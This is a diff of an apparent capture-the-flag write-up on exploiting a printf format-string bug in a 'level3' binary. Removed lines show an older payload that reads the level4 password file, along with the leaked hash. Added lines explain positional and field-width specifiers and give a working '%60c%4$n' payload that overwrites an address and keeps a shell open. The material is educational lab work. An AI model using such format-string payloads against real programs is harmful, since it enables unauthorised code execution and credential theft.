@@ -44,17 +44,14 @@ v:
    0x08048519 <+117>:   ret
 ```
 
-Exploiting `printf()` format to overrite the value in the address `0x804988c`.
+`prinft()` in x86 i386 systems takes its arguments from stack, so in case you provide it only with flags and no arguments it's going to take them from stack resulting in stack memory leak.
 
-Payload:
-```
-python -c 'import struct; print(struct.pack("I", 0x804988c)+"\x01"*36+"%08x%08x%08x%n"+"B"*4042+"whoami")'
-```
+- `%4$` : printf feature allows referencing its arguments.
+- `$60c`: printf feature called field width, it ensures the argument is of a certain length, if it's not it fills the argument with empty characters.
 
-To retrieve the the password for `level4`, we executed the following command:
+Let's craft an exploit to write `64` into this `0x804988c` address, basically we'll write 64 characters then use `%n` to write that length into printf's arguments in this case it's the fourth argument, means the fourth argument in stack.
+
+payload:
 ```
-$ python -c 'import struct; print(struct.pack("I", 0x804988c)+"\x01"*36+"%08x%08x%08x%n"+"B"*4042+"whoami; cat /home/user/level4/.pass")' | ./level3
-...
-level4
-b209ea91ad69ef36f2cf0fcbbc24c739fd10464cf545b20bea8572ebdc3c36fa
+(python -c 'print "\x8c\x98\x04\x08" + "%60c%4$n"'; cat) | ./level3
 ```
